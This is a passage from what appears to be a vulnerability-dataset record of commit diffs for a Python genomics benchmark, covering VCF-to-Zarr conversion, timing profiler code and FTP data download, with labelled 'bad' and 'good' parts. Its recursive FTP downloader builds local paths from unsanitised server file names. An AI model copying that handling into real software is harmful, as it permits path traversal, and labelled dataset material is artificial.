time from start and end times\n+            self.results.exec_time = end_time - self.results.start_time\n+\n+            # Save benchmark results\n+            self._record_runtime(self.results, \"{}.psv\".format(self.benchmark_label))\n+\n+            self.benchmark_running = False\n+\n+    def get_benchmark_results(self):\n+        return self.results\n+\n+    def _record_runtime(self, benchmark_results, output_filename):\n+        \"\"\"\n+        Records the benchmark results data entry to the specified PSV file.\n+        :param benchmark_results: BenchmarkResultsData object containing the benchmark results data\n+        :param output_filename: Which file to output the benchmark results to\n+        :type benchmark_results: BenchmarkResultsData\n+        :type output_filename: str\n+        \"\"\"\n+        output_filename = str(output_filename)\n+\n+        psv_header = not os.path.isfile(output_filename)\n+\n+        # Open the output file in append mode\n+        with open(output_filename, \"a\") as psv_file:\n+            pd_results = benchmark_results.to_pandas()\n+            pd_results.to_csv(psv_file, sep=\"|\", header=psv_header, index=False)\n+\n+\n+class Benchmark:\n+    benchmark_zarr_dir = \"\"  # Directory for which to use data from for benchmark process\n+    benchmark_zarr_file = \"\"  # File within benchmark_zarr_dir for which to use for benchmark process\n+\n+    def __init__(self, bench_conf, data_dirs, benchmark_label):\n+        \"\"\"\n+        Sets up a Benchmark object which is used to execute benchmarks.\n+        :param bench_conf: Benchmark configuration data that controls the benchmark execution\n+        :param data_dirs: DataDirectoriesConfigurationRepresentation object that contains working data directories\n+        :param benchmark_label: label to use when saving benchmark results to file\n+        :type bench_conf: config.BenchmarkConfigurationRepresentation\n+        :type data_dirs: config.DataDirectoriesConfigurationRepresentation\n+        :type benchmark_label: str\n+        \"\"\"\n+        self.bench_conf = bench_conf\n+        self.data_dirs = data_dirs\n+        self.benchmark_label = benchmark_label\n+\n+        self.benchmark_profiler = BenchmarkProfiler(benchmark_label=self.benchmark_label)\n+\n+    def run_benchmark(self):\n+        \"\"\"\n+        Executes the benchmarking process.\n+        \"\"\"\n+        if self.bench_conf is not None and self.data_dirs is not None:\n+            for run_number in range(1, self.bench_conf.benchmark_number_runs + 1):\n+                # Clear out existing files in Zarr benchmark directory\n+                # (Should be done every single run)\n+                data_service.remove_directory_tree(self.data_dirs.zarr_dir_benchmark)\n+\n+                # Update run number in benchmark profiler (for results tracking)\n+                self.benchmark_profiler.set_run_number(run_number)\n+\n+                # Prepare data directory and file locations for benchmarks\n+                if self.bench_conf.benchmark_data_input == \"vcf\":\n+                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark\n+\n+                    # Convert VCF data to Zarr format as part of benchmark\n+                    self._benchmark_convert_to_zarr()\n+\n+                elif self.bench_conf.benchmark_data_input == \"zarr\":\n+                    # Use pre-converted Zarr data which was done ahead of benchmark (i.e. in Setup mode)\n+                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_setup\n+                    self.benchmark_zarr_file = self.bench_conf.benchmark_dataset\n+\n+                else:\n+                    print(\"[Exec] Error: Invalid option supplied for benchmark data input format.\")\n+                    print(\"  - Expected data input formats: vcf, zarr\")\n+                    print(\"  - Provided data input format: {}\".format(self.bench_conf.benchmark_data_input))\n+                    exit(1)\n+\n+                # Ensure Zarr dataset exists and can be used for upcoming benchmarks\n+                benchmark_zarr_path = os.path.join(self.benchmark_zarr_dir, self.benchmark_zarr_file)\n+                if (benchmark_zarr_path != \"\") and (os.path.isdir(benchmark_zarr_path)):\n+                    # TODO: Run remaining benchmarks (e.g. loading into memory, allele counting, PCA, etc.)\n+                    pass\n+                else:\n+                    # Zarr dataset doesn't exist. Print error message and exit\n+                    print(\"[Exec] Error: Zarr dataset could not be found for benchmarking.\")\n+                    print(\"  - Zarr dataset location: {}\".format(benchmark_zarr_path))\n+\n+    def _benchmark_convert_to_zarr(self):\n+        self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark\n+        input_vcf_file = self.bench_conf.benchmark_dataset\n+        input_vcf_path = os.path.join(self.data_dirs.vcf_dir, input_vcf_file)\n+\n+        if os.path.isfile(input_vcf_path):\n+            output_zarr_file = input_vcf_file\n+            output_zarr_file = output_zarr_file[\n+                               0:len(output_zarr_file) - 4]  # Truncate *.vcf from input filename\n+            output_zarr_path = os.path.join(self.data_dirs.zarr_dir_benchmark, output_zarr_file)\n+\n+            data_service.convert_to_zarr(input_vcf_path=input_vcf_path,\n+                                         output_zarr_path=output_zarr_path,\n+                                         conversion_config=self.bench_conf.vcf_to_zarr_config,\n+                                         benchmark_runner=self.benchmark_profiler)\n+\n+            self.benchmark_zarr_file = output_zarr_file\n+        else:\n+            print(\"[Exec] Error: Dataset specified in configuration file does not exist. Exiting...\")\n+            print(\"  - Dataset file specified in configuration: {}\".format(input_vcf_file))\n+            print(\"  - Expected file location: {}\".format(input_vcf_path))\n+            exit(", "add": 152, "remove": 13, "filename": "/benchmark/core.py", "badparts": ["def run_benchmark(bench_conf):", "    pass", "def run_dynamic(ftp_location):", "    pass", "def run_static():", "    pass", "def get_remote_files(ftp_server, ftp_directory, files=None):", "    pass", "def record_runtime(benchmark, timestamp):", "    pass", "def main():", "    pass"], "goodparts": ["import allel", "import zarr", "import datetime", "import pandas as pd", "from collections import OrderedDict", "from benchmark import config, data_service", "class BenchmarkResultsData:", "    run_number = None", "    operation_name = None", "    start_time = None", "    exec_time = None", "    def to_dict(self):", "        return OrderedDict([(\"Log Timestamp\", datetime.datetime.fromtimestamp(self.start_time)),", "                            (\"Run Number\", self.run_number),", "                            (\"Operation\", self.operation_name),", "                            (\"Execution Time\", self.exec_time)])", "    def to_pandas(self):", "        data = self.to_dict()", "        df = pd.DataFrame(data, index=[1])", "        df.index.name = '#'", "        return df", "class BenchmarkProfiler:", "    benchmark_running = False", "    def __init__(self, benchmark_label):", "        self.results = BenchmarkResultsData()", "        self.benchmark_label = benchmark_label", "    def set_run_number(self, run_number):", "        if not self.benchmark_running:", "            self.results.run_number = run_number", "    def start_benchmark(self, operation_name):", "        if not self.benchmark_running:", "            self.results.operation_name = operation_name", "            self.benchmark_running = True", "            self.results.start_time = time.time()", "    def end_benchmark(self):", "        if self.benchmark_running:", "            end_time = time.time()", "            self.results.exec_time = end_time - self.results.start_time", "            self._record_runtime(self.results, \"{}.psv\".format(self.benchmark_label))", "            self.benchmark_running = False", "    def get_benchmark_results(self):", "        return self.results", "    def _record_runtime(self, benchmark_results, output_filename):", "        \"\"\"", "        Records the benchmark results data entry to the specified PSV file.", "        :param benchmark_results: BenchmarkResultsData object containing the benchmark results data", "        :param output_filename: Which file to output the benchmark results to", "        :type benchmark_results: BenchmarkResultsData", "        :type output_filename: str", "        \"\"\"", "        output_filename = str(output_filename)", "        psv_header = not os.path.isfile(output_filename)", "        with open(output_filename, \"a\") as psv_file:", "            pd_results = benchmark_results.to_pandas()", "            pd_results.to_csv(psv_file, sep=\"|\", header=psv_header, index=False)", "class Benchmark:", "    benchmark_zarr_dir = \"\"  # Directory for which to use data from for benchmark process", "    benchmark_zarr_file = \"\"  # File within benchmark_zarr_dir for which to use for benchmark process", "    def __init__(self, bench_conf, data_dirs, benchmark_label):", "        \"\"\"", "        Sets up a Benchmark object which is used to execute benchmarks.", "        :param bench_conf: Benchmark configuration data that controls the benchmark execution", "        :param data_dirs: DataDirectoriesConfigurationRepresentation object that contains working data directories", "        :param benchmark_label: label to use when saving benchmark results to file", "        :type bench_conf: config.BenchmarkConfigurationRepresentation", "        :type data_dirs: config.DataDirectoriesConfigurationRepresentation", "        :type benchmark_label: str", "        \"\"\"", "        self.bench_conf = bench_conf", "        self.data_dirs = data_dirs", "        self.benchmark_label = benchmark_label", "        self.benchmark_profiler = BenchmarkProfiler(benchmark_label=self.benchmark_label)", "    def run_benchmark(self):", "        \"\"\"", "        Executes the benchmarking process.", "        \"\"\"", "        if self.bench_conf is not None and self.data_dirs is not None:", "            for run_number in range(1, self.bench_conf.benchmark_number_runs + 1):", "                data_service.remove_directory_tree(self.data_dirs.zarr_dir_benchmark)", "                self.benchmark_profiler.set_run_number(run_number)", "                if self.bench_conf.benchmark_data_input == \"vcf\":", "                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark", "                    self._benchmark_convert_to_zarr()", "                elif self.bench_conf.benchmark_data_input == \"zarr\":", "                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_setup", "                    self.benchmark_zarr_file = self.bench_conf.benchmark_dataset", "                else:", "                    print(\"[Exec] Error: Invalid option supplied for benchmark data input format.\")", "                    print(\"  - Expected data input formats: vcf, zarr\")", "                    print(\"  - Provided data input format: {}\".format(self.bench_conf.benchmark_data_input))", "                    exit(1)", "                benchmark_zarr_path = os.path.join(self.benchmark_zarr_dir, self.benchmark_zarr_file)", "                if (benchmark_zarr_path != \"\") and (os.path.isdir(benchmark_zarr_path)):", "                    pass", "                else:", "                    print(\"[Exec] Error: Zarr dataset could not be found for benchmarking.\")", "                    print(\"  - Zarr dataset location: {}\".format(benchmark_zarr_path))", "    def _benchmark_convert_to_zarr(self):", "        self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark", "        input_vcf_file = self.bench_conf.benchmark_dataset", "        input_vcf_path = os.path.join(self.data_dirs.vcf_dir, input_vcf_file)", "        if os.path.isfile(input_vcf_path):", "            output_zarr_file = input_vcf_file", "            output_zarr_file = output_zarr_file[", "                               0:len(output_zarr_file) - 4]  # Truncate *.vcf from input filename", "            output_zarr_path = os.path.join(self.data_dirs.zarr_dir_benchmark, output_zarr_file)", "            data_service.convert_to_zarr(input_vcf_path=input_vcf_path,", "                                         output_zarr_path=output_zarr_path,", "                                         conversion_config=self.bench_conf.vcf_to_zarr_config,", "                                         benchmark_runner=self.benchmark_profiler)", "            self.benchmark_zarr_file = output_zarr_file", "        else:", "            print(\"[Exec] Error: Dataset specified in configuration file does not exist. Exiting...\")", "            print(\"  - Dataset file specified in configuration: {}\".format(input_vcf_file))", "            print(\"  - Expected file location: {}\".format(input_vcf_path))", "            exit("]}], "source": "\n\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, determines the runtime mode(dynamic vs. static); if dynamic, gets the benchmark data from the server, runs the benchmarks, and records the timer results. \"\"\" import time import csv import logging def run_benchmark(bench_conf): pass def run_dynamic(ftp_location): pass def run_static(): pass def get_remote_files(ftp_server, ftp_directory, files=None): pass def record_runtime(benchmark, timestamp): pass def main(): pass ", "sourceWithComments": "\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, \ndetermines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,\nruns the benchmarks, and records the timer results. \"\"\"\n\nimport time  # for benchmark timer\nimport csv  # for writing results\nimport logging\n\n\ndef run_benchmark(bench_conf):\n    pass\n\n\ndef run_dynamic(ftp_location):\n    pass\n\n\ndef run_static():\n    pass\n\n\ndef get_remote_files(ftp_server, ftp_directory, files=None):\n    pass\n\n\ndef record_runtime(benchmark, timestamp):\n    pass\n\n\n# temporary here\ndef main():\n    pass\n"}, "/benchmark/data_service.py": {"changes": [{"diff": "\n import numpy as np\n import zarr\n import numcodecs\n-from numcodecs import Blosc, LZ4, LZMA\n-from benchmark import config\n+from numcodecs import Blosc\n \n import gzip\n import shutil\n", "add": 1, "remove": 2, "filename": "/benchmark/data_service.py", "badparts": ["from numcodecs import Blosc, LZ4, LZMA", "from benchmark import config"], "goodparts": ["from numcodecs import Blosc"]}, {"diff": "\n                         conversion_config=conversion_config)\n \n \n-def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):\n+def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config, benchmark_runner=None):\n     \"\"\" Converts the original data (VCF) to a Zarr format. Only converts a single VCF file.\n+    If a BenchmarkRunner is provided, the actual VCF to Zarr conversion process will be benchmarked.\n     :param input_vcf_path: The input VCF file location\n     :param output_zarr_path: The desired Zarr output location\n     :param conversion_config: Configuration data for the conversion\n+    :param benchmark_runner: BenchmarkRunner object to be used for benchmarking process\n     :type input_vcf_path: str\n     :type output_zarr_path: str\n     :type conversion_config: config.VCFtoZarrConfigurationRepresentation\n+    :type benchmark_runner: core.BenchmarkProfiler\n     \"\"\"\n     if conversion_config is not None:\n         # Ensure var is string, not pathlib.Path\n         output_zarr_path = str(output_zarr_path)\n \n+        # Get fields to extract (for unit testing only)\n+        fields = conversion_config.fields\n+\n         # Get alt number\n         if conversion_config.alt_number is None:\n             print(\"[VCF-Zarr] Determining maximum number of ALT alleles by scaling all variants in the VCF file.\")\n", "add": 7, "remove": 1, "filename": "/benchmark/data_service.py", "badparts": ["def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):"], "goodparts": ["def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config, benchmark_runner=None):", "    If a BenchmarkRunner is provided, the actual VCF to Zarr conversion process will be benchmarked.", "    :param benchmark_runner: BenchmarkRunner object to be used for benchmarking process", "    :type benchmark_runner: core.BenchmarkProfiler", "        fields = conversion_config.fields"]}, {"diff": "\n         else:\n             raise ValueError(\"Unexpected compressor type specified.\")\n \n-        print(\"[VCF-Zarr] Using {} compressor.\".format(conversion_config.compressor))\n+        if benchmark_runner is not None:\n+            benchmark_runner.start_benchmark(operation_name=\"Convert VCF to Zarr\")\n \n-        print(\"[VCF-Zarr] Performing VCF to Zarr conversion...\")\n         # Perform the VCF to Zarr conversion\n-        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,\n+        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True, fields=fields,\n                           log=sys.stdout, compressor=compressor, chunk_length=chunk_length, chunk_width=chunk_width)\n-        print(\"[VCF-Zarr] Done.\")\n+\n+        if benchmark_runner is not None:\n+            benchmark_runner.end_benchmark()\n+\n+\n+GENOTYPE_ARRAY_NORMAL = 0\n+GENOTYPE_ARRAY_DASK = 1\n+GENOTYPE_ARRAY_CHUNKED = 2\n+\n+\n+def get_genotype_data(callset, genotype_array_type=GENOTYPE_ARRAY_DASK):\n+    genotype_ref_name = ''\n+\n+    # Ensure 'calldata' is within the callset\n+    if 'calldata' in callset:\n+        # Try to find either GT or genotype in calldata\n+        if 'GT' in callset['calldata']:\n+            genotype_ref_name = 'GT'\n+        elif 'genotype' in callset['calldata']:\n+            genotype_ref_name = 'genotype'\n+        else:\n+            return None\n+    else:\n+        return None\n+\n+    if genotype_array_type == GENOTYPE_ARRAY_NORMAL:\n+        return allel.GenotypeArray(callset['calldata'][genotype_ref_name])\n+    elif genotype_array_type == GENOTYPE_ARRAY_DASK:\n+        return allel.GenotypeDaskArray(callset['calldata'][genotype_ref_name])\n+    elif genotype_array_type == GENOTYPE_ARRAY_CHUNKED:\n+        return allel.GenotypeChunkedArray(callset['calldata'][genotype_ref_name])\n+    else:\n+        return N", "add": 36, "remove": 4, "filename": "/benchmark/data_service.py", "badparts": ["        print(\"[VCF-Zarr] Using {} compressor.\".format(conversion_config.compressor))", "        print(\"[VCF-Zarr] Performing VCF to Zarr conversion...\")", "        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,", "        print(\"[VCF-Zarr] Done.\")"], "goodparts": ["        if benchmark_runner is not None:", "            benchmark_runner.start_benchmark(operation_name=\"Convert VCF to Zarr\")", "        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True, fields=fields,", "        if benchmark_runner is not None:", "            benchmark_runner.end_benchmark()", "GENOTYPE_ARRAY_NORMAL = 0", "GENOTYPE_ARRAY_DASK = 1", "GENOTYPE_ARRAY_CHUNKED = 2", "def get_genotype_data(callset, genotype_array_type=GENOTYPE_ARRAY_DASK):", "    genotype_ref_name = ''", "    if 'calldata' in callset:", "        if 'GT' in callset['calldata']:", "            genotype_ref_name = 'GT'", "        elif 'genotype' in callset['calldata']:", "            genotype_ref_name = 'genotype'", "        else:", "            return None", "    else:", "        return None", "    if genotype_array_type == GENOTYPE_ARRAY_NORMAL:", "        return allel.GenotypeArray(callset['calldata'][genotype_ref_name])", "    elif genotype_array_type == GENOTYPE_ARRAY_DASK:", "        return allel.GenotypeDaskArray(callset['calldata'][genotype_ref_name])", "    elif genotype_array_type == GENOTYPE_ARRAY_CHUNKED:", "        return allel.GenotypeChunkedArray(callset['calldata'][genotype_ref_name])", "    else:", "        return N"]}], "source": "\n\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, determines the runtime mode(dynamic vs. static); if dynamic, gets the benchmark data from the server, runs the benchmarks, and records the timer results. \"\"\" import urllib.request from ftplib import FTP, FTP_TLS, error_perm import time import csv import logging import os.path import pathlib import allel import sys import functools import numpy as np import zarr import numcodecs from numcodecs import Blosc, LZ4, LZMA from benchmark import config import gzip import shutil def create_directory_tree(path): \"\"\" Creates directories for the path specified. :param path: The path to create dirs/subdirs for :type path: str \"\"\" path=str(path) pathlib.Path(path).mkdir(parents=True, exist_ok=True) def remove_directory_tree(path): \"\"\" Removes the directory and all subdirectories/files within the path specified. :param path: The path to the directory to remove :type path: str \"\"\" if os.path.exists(path): shutil.rmtree(path, ignore_errors=True) def fetch_data_via_ftp(ftp_config, local_directory): \"\"\" Get benchmarking data from a remote ftp server. :type ftp_config: config.FTPConfigurationRepresentation :type local_directory: str \"\"\" if ftp_config.enabled: create_directory_tree(local_directory) if ftp_config.use_tls: ftp=FTP_TLS(ftp_config.server) ftp.login(ftp_config.username, ftp_config.password) ftp.prot_p() else: ftp=FTP(ftp_config.server) ftp.login(ftp_config.username, ftp_config.password) if not ftp_config.files: fetch_data_via_ftp_recursive(ftp=ftp, local_directory=local_directory, remote_directory=ftp_config.directory) else: ftp.cwd(ftp_config.directory) file_counter=1 file_list_total=len(ftp_config.files) for remote_filename in ftp_config.files: local_filename=remote_filename filepath=os.path.join(local_directory, local_filename) if not os.path.exists(filepath): with open(filepath, \"wb\") as local_file: try: ftp.retrbinary('RETR %s' % remote_filename, local_file.write) print(\"[Setup][FTP]({}/{}) File downloaded:{}\".format(file_counter, file_list_total, filepath)) except error_perm: print(\"[Setup][FTP]({}/{}) Error downloading file. Skipping:{}\".format(file_counter, file_list_total, filepath)) local_file.close() os.remove(filepath) else: print(\"[Setup][FTP]({}/{}) File already exists. Skipping:{}\".format(file_counter, file_list_total, filepath)) file_counter=file_counter +1 ftp.close() def fetch_data_via_ftp_recursive(ftp, local_directory, remote_directory, remote_subdirs_list=None): \"\"\" Recursive function that automatically downloads all files with a FTP directory, including subdirectories. :type ftp: ftplib.FTP :type local_directory: str :type remote_directory: str :type remote_subdirs_list: list \"\"\" if(remote_subdirs_list is not None) and(len(remote_subdirs_list) > 0): remote_path_relative=\"/\".join(remote_subdirs_list) remote_path_absolute=\"/\" +remote_directory +\"/\" +remote_path_relative +\"/\" else: remote_subdirs_list=[] remote_path_relative=\"\" remote_path_absolute=\"/\" +remote_directory +\"/\" try: local_path=local_directory +\"/\" +remote_path_relative os.mkdir(local_path) print(\"[Setup][FTP] Created local folder:{}\".format(local_path)) except OSError: pass except error_perm: print(\"[Setup][FTP] Error: Could not change to:{}\".format(remote_path_absolute)) ftp.cwd(remote_path_absolute) file_list=ftp.nlst() file_counter=1 file_list_total=len(file_list) for file in file_list: file_path_local=local_directory +\"/\" +remote_path_relative +\"/\" +file if not os.path.isfile(file_path_local): try: ftp.cwd(remote_path_absolute +file) print(\"[Setup][FTP] Switching to directory:{}\".format(remote_path_relative +\"/\" +file)) new_remote_subdirs_list=remote_subdirs_list.copy() new_remote_subdirs_list.append(file) fetch_data_via_ftp_recursive(ftp=ftp, local_directory=local_directory, remote_directory=remote_directory, remote_subdirs_list=new_remote_subdirs_list) ftp.cwd(remote_path_absolute) except error_perm: temp=ftp.nlst() if not os.path.isfile(file_path_local): with open(file_path_local, \"wb\") as local_file: ftp.retrbinary('RETR{}'.format(file), local_file.write) print(\"[Setup][FTP]({}/{}) File downloaded:{}\".format(file_counter, file_list_total, file_path_local)) else: print(\"[Setup][FTP]({}/{}) File already exists. Skipping:{}\".format(file_counter, file_list_total, file_path_local)) file_counter=file_counter +1 def fetch_file_from_url(url, local_file): urllib.request.urlretrieve(url, local_file) def decompress_gzip(local_file_gz, local_file): with open(local_file, 'wb') as file_out, gzip.open(local_file_gz, 'rb') as file_in: shutil.copyfileobj(file_in, file_out) def process_data_files(input_dir, temp_dir, output_dir): \"\"\" Iterates through all files in input_dir and processes *.vcf.gz files to *.vcf, placed in output_dir. Additionally moves *.vcf files to output_dir Note: This method searches through all subdirectories within input_dir, and files are placed in root of output_dir. :param input_dir: The input directory containing files to process :param temp_dir: The temporary directory for unzipping *.gz files, etc. :param output_dir: The output directory where processed *.vcf files should go :type input_dir: str :type temp_dir: str :type output_dir: str \"\"\" input_dir=str(input_dir) temp_dir=str(temp_dir) output_dir=str(output_dir) create_directory_tree(input_dir) create_directory_tree(temp_dir) create_directory_tree(output_dir) pathlist_gz=pathlib.Path(input_dir).glob(\"**/*.gz\") for path in pathlist_gz: path_str=str(path) file_output_str=path_leaf(path_str) file_output_str=file_output_str[0:len(file_output_str) -3] path_temp_output=str(pathlib.Path(temp_dir, file_output_str)) print(\"[Setup][Data] Decompressing file:{}\".format(path_str)) print(\" -Output:{}\".format(path_temp_output)) decompress_gzip(path_str, path_temp_output) pathlist_vcf_temp=pathlib.Path(temp_dir).glob(\"**/*.vcf\") for path in pathlist_vcf_temp: path_temp_str=str(path) filename_str=path_leaf(path_temp_str) path_vcf_str=str(pathlib.Path(output_dir, filename_str)) shutil.move(path_temp_str, path_vcf_str) remove_directory_tree(temp_dir) pathlist_vcf_input=pathlib.Path(input_dir).glob(\"**/*.vcf\") for path in pathlist_vcf_input: path_input_str=str(path) filename_str=path_leaf(path_input_str) path_vcf_str=str(pathlib.Path(output_dir, filename_str)) shutil.copy(path_input_str, path_vcf_str) def path_head(path): head, tail=os.path.split(path) return head def path_leaf(path): head, tail=os.path.split(path) return tail or os.path.basename(head) def read_file_contents(local_filepath): if os.path.isfile(local_filepath): with open(local_filepath) as f: data=f.read() return data else: return None def setup_vcf_to_zarr(input_vcf_dir, output_zarr_dir, conversion_config): \"\"\" Converts all VCF files in input directory to Zarr format, placed in output directory, based on conversion configuration parameters :param input_vcf_dir: The input directory where VCF files are located :param output_zarr_dir: The output directory to place Zarr-formatted data :param conversion_config: Configuration data for the conversion :type input_vcf_dir: str :type output_zarr_dir: str :type conversion_config: config.VCFtoZarrConfigurationRepresentation \"\"\" input_vcf_dir=str(input_vcf_dir) output_zarr_dir=str(output_zarr_dir) create_directory_tree(input_vcf_dir) create_directory_tree(output_zarr_dir) pathlist_vcf=pathlib.Path(input_vcf_dir).glob(\"**/*.vcf\") for path in pathlist_vcf: path_str=str(path) file_output_str=path_leaf(path_str) file_output_str=file_output_str[0:len(file_output_str) -4] path_zarr_output=str(pathlib.Path(output_zarr_dir, file_output_str)) print(\"[Setup][Data] Converting VCF file to Zarr format:{}\".format(path_str)) print(\" -Output:{}\".format(path_zarr_output)) convert_to_zarr(input_vcf_path=path_str, output_zarr_path=path_zarr_output, conversion_config=conversion_config) def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config): \"\"\" Converts the original data(VCF) to a Zarr format. Only converts a single VCF file. :param input_vcf_path: The input VCF file location :param output_zarr_path: The desired Zarr output location :param conversion_config: Configuration data for the conversion :type input_vcf_path: str :type output_zarr_path: str :type conversion_config: config.VCFtoZarrConfigurationRepresentation \"\"\" if conversion_config is not None: output_zarr_path=str(output_zarr_path) if conversion_config.alt_number is None: print(\"[VCF-Zarr] Determining maximum number of ALT alleles by scaling all variants in the VCF file.\") callset=allel.read_vcf(input_vcf_path, fields=['numalt'], log=sys.stdout) numalt=callset['variants/numalt'] alt_number=np.max(numalt) else: print(\"[VCF-Zarr] Using alt number provided in configuration.\") alt_number=conversion_config.alt_number print(\"[VCF-Zarr] Alt number:{}\".format(alt_number)) chunk_length=allel.vcf_read.DEFAULT_CHUNK_LENGTH if conversion_config.chunk_length is not None: chunk_length=conversion_config.chunk_length print(\"[VCF-Zarr] Chunk length:{}\".format(chunk_length)) chunk_width=allel.vcf_read.DEFAULT_CHUNK_WIDTH if conversion_config.chunk_width is not None: chunk_width=conversion_config.chunk_width print(\"[VCF-Zarr] Chunk width:{}\".format(chunk_width)) if conversion_config.compressor==\"Blosc\": compressor=Blosc(cname=conversion_config.blosc_compression_algorithm, clevel=conversion_config.blosc_compression_level, shuffle=conversion_config.blosc_shuffle_mode) else: raise ValueError(\"Unexpected compressor type specified.\") print(\"[VCF-Zarr] Using{} compressor.\".format(conversion_config.compressor)) print(\"[VCF-Zarr] Performing VCF to Zarr conversion...\") allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True, log=sys.stdout, compressor=compressor, chunk_length=chunk_length, chunk_width=chunk_width) print(\"[VCF-Zarr] Done.\") ", "sourceWithComments": "\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, \ndetermines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,\nruns the benchmarks, and records the timer results. \"\"\"\n\nimport urllib.request\nfrom ftplib import FTP, FTP_TLS, error_perm\nimport time  # for benchmark timer\nimport csv  # for writing results\nimport logging\nimport os.path\nimport pathlib\nimport allel\nimport sys\nimport functools\nimport numpy as np\nimport zarr\nimport numcodecs\nfrom numcodecs import Blosc, LZ4, LZMA\nfrom benchmark import config\n\nimport gzip\nimport shutil\n\n\ndef create_directory_tree(path):\n    \"\"\"\n    Creates directories for the path specified.\n    :param path: The path to create dirs/subdirs for\n    :type path: str\n    \"\"\"\n    path = str(path)  # Ensure path is in str format\n    pathlib.Path(path).mkdir(parents=True, exist_ok=True)\n\n\ndef remove_directory_tree(path):\n    \"\"\"\n    Removes the directory and all subdirectories/files within the path specified.\n    :param path: The path to the directory to remove\n    :type path: str\n    \"\"\"\n\n    if os.path.exists(path):\n        shutil.rmtree(path, ignore_errors=True)\n\n\ndef fetch_data_via_ftp(ftp_config, local_directory):\n    \"\"\" Get benchmarking data from a remote ftp server. \n    :type ftp_config: config.FTPConfigurationRepresentation\n    :type local_directory: str\n    \"\"\"\n    if ftp_config.enabled:\n        # Create local directory tree if it does not exist\n        create_directory_tree(local_directory)\n\n        # Login to FTP server\n        if ftp_config.use_tls:\n            ftp = FTP_TLS(ftp_config.server)\n            ftp.login(ftp_config.username, ftp_config.password)\n            ftp.prot_p()  # Request secure data connection for file retrieval\n        else:\n            ftp = FTP(ftp_config.server)\n            ftp.login(ftp_config.username, ftp_config.password)\n\n        if not ftp_config.files:  # Auto-download all files in directory\n            fetch_data_via_ftp_recursive(ftp=ftp,\n                                         local_directory=local_directory,\n                                         remote_directory=ftp_config.directory)\n        else:\n            ftp.cwd(ftp_config.directory)\n\n            file_counter = 1\n            file_list_total = len(ftp_config.files)\n\n            for remote_filename in ftp_config.files:\n                local_filename = remote_filename\n                filepath = os.path.join(local_directory, local_filename)\n                if not os.path.exists(filepath):\n                    with open(filepath, \"wb\") as local_file:\n                        try:\n                            ftp.retrbinary('RETR %s' % remote_filename, local_file.write)\n                            print(\"[Setup][FTP] ({}/{}) File downloaded: {}\".format(file_counter, file_list_total,\n                                                                                    filepath))\n                        except error_perm:\n                            # Error downloading file. Display error message and delete local file\n                            print(\"[Setup][FTP] ({}/{}) Error downloading file. Skipping: {}\".format(file_counter,\n                                                                                                     file_list_total,\n                                                                                                     filepath))\n                            local_file.close()\n                            os.remove(filepath)\n                else:\n                    print(\"[Setup][FTP] ({}/{}) File already exists. Skipping: {}\".format(file_counter, file_list_total,\n                                                                                          filepath))\n                file_counter = file_counter + 1\n        # Close FTP connection\n        ftp.close()\n\n\ndef fetch_data_via_ftp_recursive(ftp, local_directory, remote_directory, remote_subdirs_list=None):\n    \"\"\"\n    Recursive function that automatically downloads all files with a FTP directory, including subdirectories.\n    :type ftp: ftplib.FTP\n    :type local_directory: str\n    :type remote_directory: str\n    :type remote_subdirs_list: list\n    \"\"\"\n\n    if (remote_subdirs_list is not None) and (len(remote_subdirs_list) > 0):\n        remote_path_relative = \"/\".join(remote_subdirs_list)\n        remote_path_absolute = \"/\" + remote_directory + \"/\" + remote_path_relative + \"/\"\n    else:\n        remote_subdirs_list = []\n        remote_path_relative = \"\"\n        remote_path_absolute = \"/\" + remote_directory + \"/\"\n\n    try:\n        local_path = local_directory + \"/\" + remote_path_relative\n        os.mkdir(local_path)\n        print(\"[Setup][FTP] Created local folder: {}\".format(local_path))\n    except OSError:  # Folder already exists at destination. Do nothing.\n        pass\n    except error_perm:  # Invalid Entry\n        print(\"[Setup][FTP] Error: Could not change to: {}\".format(remote_path_absolute))\n\n    ftp.cwd(remote_path_absolute)\n\n    # Get list of remote files/folders in current directory\n    file_list = ftp.nlst()\n\n    file_counter = 1\n    file_list_total = len(file_list)\n\n    for file in file_list:\n        file_path_local = local_directory + \"/\" + remote_path_relative + \"/\" + file\n        if not os.path.isfile(file_path_local):\n            try:\n                # Determine if a file or folder\n                ftp.cwd(remote_path_absolute + file)\n                # Path is for a folder. Run recursive function in new folder\n                print(\"[Setup][FTP] Switching to directory: {}\".format(remote_path_relative + \"/\" + file))\n                new_remote_subdirs_list = remote_subdirs_list.copy()\n                new_remote_subdirs_list.append(file)\n                fetch_data_via_ftp_recursive(ftp=ftp, local_directory=local_directory,\n                                             remote_directory=remote_directory,\n                                             remote_subdirs_list=new_remote_subdirs_list)\n                # Return up one level since we are using recursion\n                ftp.cwd(remote_path_absolute)\n            except error_perm:\n                # file is an actual file. Download if it doesn't already exist on filesystem.\n                temp = ftp.nlst()\n                if not os.path.isfile(file_path_local):\n                    with open(file_path_local, \"wb\") as local_file:\n                        ftp.retrbinary('RETR {}'.format(file), local_file.write)\n                    print(\"[Setup][FTP] ({}/{}) File downloaded: {}\".format(file_counter, file_list_total,\n                                                                            file_path_local))\n        else:\n            print(\"[Setup][FTP] ({}/{}) File already exists. Skipping: 